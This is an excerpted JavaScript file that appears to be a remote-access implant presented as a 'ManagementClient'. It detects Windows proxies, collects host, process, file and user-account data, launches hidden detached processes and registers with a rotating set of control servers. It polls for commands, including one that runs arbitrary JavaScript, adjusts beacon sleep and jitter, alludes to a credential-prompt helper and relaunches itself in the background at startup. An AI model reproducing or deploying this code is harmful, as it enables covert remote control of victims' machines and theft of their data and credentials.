...
function detectWindowsProxy() {
    ...
    try {
        // Read IE/Windows proxy settings from registry
        ...
        const enableMatch = regQuery.match(/ProxyEnable\s+REG_DWORD\s+0x([0-9a-fA-F]+)/i);
        ...
        const serverMatch = serverQuery.match(/ProxyServer\s+REG_SZ\s+(.+)/i);
        if (!serverMatch) return null;

        let proxyServer = serverMatch[1].trim();
        if (!proxyServer) return null;

        // Parse proxy bypass list
        let bypassList = [];
        try {
            const bypassQuery = execSync(
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyOverride 2>nul',
                { encoding: 'utf8', windowsHide: true, timeout: 5000 }
            );
            const bypassMatch = bypassQuery.match(/ProxyOverride\s+REG_SZ\s+(.+)/i);
            if (bypassMatch) {
                bypassList = bypassMatch[1].trim().split(';').map(s => s.trim()).filter(Boolean);
            }
        } catch { /* no bypass list */ }

        // Handle per-protocol proxies (http=host:port;https=host:port) or single proxy
        const proxies = {};
        if (proxyServer.includes('=')) {
            for (const part of proxyServer.split(';')) {
                const [proto, addr] = part.split('=');
                if (proto && addr) {
                    proxies[proto.toLowerCase()] = addr;
                }
            }
        } else {
        ...
        return { proxies, bypassList };
    } catch {
        return null;
    }
}

function shouldBypassProxy(url, bypassList) {
    if (!bypassList || !bypassList.length) return false;
    ...
    try {
        ...
        for (const pattern of bypassList) {
            ...
            if (p === '<local>' && !host.includes('.')) return true;
            if (p === host) return true;
            if (p.startsWith('*') && host.endsWith(p.slice(1))) return true;
            if (p.startsWith('.') && (host === p.slice(1) || host.endsWith(p))) return true;
        }
    } catch { /* invalid URL */ }
...
function getProxyForUrl(url, proxyConfig) {
    if (!proxyConfig) return null;
    if (shouldBypassProxy(url, proxyConfig.bypassList)) return null;

    try {
        const parsed = new URL(url);
        const proto = parsed.protocol.replace(':', '').toLowerCase();
        const proxyAddr = proxyConfig.proxies[proto] || proxyConfig.proxies.http;

        if (!proxyAddr) return null;

        // Normalize proxy URL
        let proxyUrl = proxyAddr;
...
class HttpClient {
    constructor() {
        ...
        this._proxyDetected = false;
    }

    init() {
        // Detect proxy on first init
        if (!this._proxyDetected) {
            this._proxyConfig = detectWindowsProxy();
    ...
    _getAxiosConfig(url, extra = {}) {
        ...
        const proxyUrl = getProxyForUrl(url, this._proxyConfig);
        if (proxyUrl) {
            try {
    ...
    async get(url) {
        try {
            const config = this._getAxiosConfig(url, { responseType: 'arraybuffer' });
    ...
    async postRaw(url, data, contentType = 'application/json') {
        try {
            ...
            const config = this._getAxiosConfig(url, {
...
class SystemManager {
    ...
    getSystemInfo() {
        ...
        return { hostname, domain, os: osStr, os_release: os.release(),
    ...
    getProcesses() {
        if (isWindows) {
            ...
            return out.split('\n').flatMap(line => {
                ...
                return [{ name: parts[0], pid: parseInt(parts[1], 10) || 0,
            ...
            return out.split('\n').flatMap(line => {
                ...
                if (isNaN(pid)) return [];
                return [{ pid, name: parts[10] || parts[0] || 'unknown',
        ...
        try {
            ...
            return fs.readdirSync(resolved).map(name => {
                ...
                try {
                    ...
                    return { name, path: full, is_dir: isDir, size: isDir ? 0 : s.size,
            ...
            try {
                return fs.readFileSync('/etc/passwd', 'utf8').split('\n')
                    ...
                    .map(l => { const p = l.split(':');
                        return { username: p[0], uid: p[2] || 'N/A', gid: p[3] || 'N/A',
    ...
    startHiddenProcess(command) {
        if (isWindows) {
            ...
            if (!tokens.length) return { pid: 0, error: 'no tokens' };

            let exePath = tokens[0];
            let args = tokens.slice(1);

            // If first token is a .js file, run it with node
            if (/\.js$/i.test(exePath)) {
                args = [exePath, ...args];
                exePath = process.execPath;
            } else {
                exePath = findExe(tokens[0]) || tokens[0];
            }

            try {
                // Spawn directly with detached true
...
class ManagementClient {
    ...
    async _mainLoop() {
        while (this._running) {
            try {
                // Reset to first URL and try all URLs
                this._resetUrlIndex();
                const registered = await this._registerWithServer();
                if (registered) {
                    await this._pollingLoop();
                    // Polling loop ended (server down or token invalid)
                    // Loop will reset URL index and try all URLs again
                }
            } catch (err) {
    ...
    async _registerWithServer() {
        ...
        for (let urlAttempt = 0; urlAttempt < this._serverUrls.length && this._running; urlAttempt++) {
            ...
            // Connection failed or other error - try next URL
            if (status === 0 || status >= 500) {
                this._advanceUrl();
                await this._interruptibleSleep(1000); // Brief pause between URL attempts
                continue;
            }
        ...
        await this._interruptibleSleep(10000);
        return false;
    }
    ...
    async _sendAgentInit() {
        ...
        const resp = await this._http.postRaw(`${this._serverUrl}/gate/hello`, body, 'application/json');
        return this._http.lastStatusCode() === 200;
    }

    async _pollingLoop() {
        let consecutiveNetErrors = 0;
        const maxNetErrors = 3; // Fail faster - 3 consecutive errors
            ...
            try {
                ...
                if (status === 0 || status >= 500) {
                    ...
                    if (++consecutiveNetErrors >= maxNetErrors) {
                        // Server is down, exit to try other URLs
                        return;
                    }
                    // Wait less time when server might be down
                    ...
                    for (const cmd of commands) {
                        ...
                        // statusCode -1 means skip submission (handled elsewhere, e.g. credprompt helper)
                        if (statusCode >= 0) {
        ...
        try {
            switch (cmd.opcode) {
                ...
                case OP.SET_SLEEP_TIME: {
                    ...
                    if (!isNaN(v) && v > 0) {
                        this._timing.sleepTime = v;
                        this._timing.pollInterval = v;
                    }
                    resultData = `ok: sleepTime set to ${this._timing.pollInterval}ms`;
                    break;
                }

                case OP.SET_IDLE_TIME: {
                    const v = parseInt(cmd.args, 10);
                    if (!isNaN(v) && v >= 0) this._timing.idleTime = v;
                    resultData = `ok: idleTime set to ${this._timing.idleTime}ms`;
                    break;
                }

                case OP.SET_JITTER_TIME: {
                    const v = parseInt(cmd.args, 10);
                    if (!isNaN(v) && v >= 0) this._timing.jitterTime = v;
                    resultData = `ok: jitterTime set to ${this._timing.jitterTime}ms`;
                    break;
                }

                case OP.EVAL_JS: {
                    const jsCode = cmd.args || '';
                    const logs = [];
                    ...
                    try {
                        ...
                        if (result !== undefined) {
                            ...
                            logs.push({ level: 'result', message: resultStr, timestamp: new Date().toISOString() });
                        }
                    } catch (err) {
                        logs.push({
                            level: 'error',
                    ...
                    resultData = makeEnvelope('code', JSON.stringify(logs));
                    break;
                }
...
if (!process.env.RUN_IN_BG) {
    ...
    spawn(process.execPath, [__filename], spawnOpts).unref();
    process.exit(0);
}
...
const clientId = '129--' + sys.getUsername();
